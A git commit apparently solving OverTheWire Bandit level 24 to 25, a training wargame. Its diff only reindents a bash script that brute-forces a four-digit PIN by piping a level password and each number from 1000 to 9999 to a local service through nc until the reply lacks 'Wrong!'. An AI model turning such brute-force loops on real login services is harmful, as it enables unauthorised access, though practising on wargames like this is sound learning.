8b6099e9fc42fc7c0512058f06809fd0b581a7a3
atalay <atalaysametergen07@gmail.com>
2019-04-26 13:38:57 +0300

    OverTheWire Bandit level 24 to 25

--- pin_bruteforcing.sh
+++ pin_bruteforcing.sh
@@ -2,12 +2,12 @@
 passw="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
 for i in {1000..9999}
 do {
-    attempt="$(echo $passw $i | nc localhost 30002)"
-    if ! [[ $attempt == *"Wrong!"* ]]; then
-		echo -ne $i
-        break
-    else
-		echo "Failed : $i " 
-    fi
+attempt="$(echo $passw $i | nc localhost 30002)"
+if ! [[ $attempt == *"Wrong!"* ]]; then
+    echo -ne $i
+    break
+else
+    echo "Failed : $i " 
+fi
 }
 done
